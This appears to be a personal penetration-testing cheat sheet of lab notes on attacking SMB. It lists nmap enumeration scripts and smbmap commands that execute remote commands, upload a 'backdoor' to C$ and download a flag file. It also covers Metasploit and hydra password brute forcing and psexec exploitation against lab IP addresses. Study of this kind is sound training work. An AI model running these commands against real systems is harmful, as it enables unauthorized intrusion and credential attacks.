# SMB

## SMB enum

<aside>
üí°

‚ÄúThe IPC$ share is also known as a null session connection. By using this session, Windows
lets anonymous users perform certain activities, such as enumerating the names of domain
accounts and network shares.‚Äù
Scanning all shares using valid credentials to check the permissions.

</aside>

```bash
nmap -p445 --script smb-protocols 10.0.17.200

security mode script to return the information about the SMB security leve
nmap -p445 --script smb-security-mode 10.0.17.200

nmap -p445 --script smb-enum-sessions 10.0.17.200

nmap -p445 --script smb-enum-sessions --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-enum-shares 10.0.17.200

nmap -p445 --script smb-enum-shares --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-enum-users --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-server-stats --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-enum-domains --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-enum-groups --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-enum-services --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-enum-shares,smb-ls --script-args
smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

SMBMap 

smbmap -u guest -p "" -d . -H 10.0.28.123

smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123

smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig'

smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L

List contents of the directory of C:\ drive.
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'

Uploading a sample file
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor'
'C$\backdoor'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'

Download the flag.txt file.
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download
'C$\flag.txt'
```

## Brute Force SMB

```bash
Metasploit
msfconsole
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS 192.212.251.3
exploit

gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.212.251.3 smb

smbclient -L 192.212.251.3 -U jane

smbclient //192.212.251.3/jane -U jane

smbclient //192.212.251.3/admin -U admin

Metasploit
msfconsole
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS 192.212.251.3
exploit

enum4linux -r -u "admin" -p "password1"
```

## SMB Attack

```bash
nmap -p445 --script smb-protocols 10.0.0.242

use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.0.0.242
set VERBOSE false
exploit

use exploit/windows/smb/psexec
set RHOSTS 10.0.0.242
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```